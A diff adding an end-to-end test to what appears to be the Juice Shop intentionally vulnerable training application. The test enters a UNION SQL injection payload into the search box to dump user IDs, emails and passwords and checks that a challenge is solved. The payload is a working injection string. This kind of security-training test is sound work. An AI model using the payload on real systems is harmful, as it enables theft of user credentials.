@@ -44,4 +44,15 @@ describe('search', function () {
 
     protractor.expect.challengeSolved({challenge: 'xss1'});
 
+    it('search query should be susceptible to UNION SQL injection attacks', function () {
+        element(by.model('searchQuery')).sendKeys('\') union select null,id,email,password,null,null,null from users--');
+
+        element(by.id('searchButton')).click();
+
+        var productDescriptions = element.all(by.repeater('product in products').column('description'));
+        expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
+    });
+
+    protractor.expect.challengeSolved({challenge: 'unionSqlI'});
+
 });
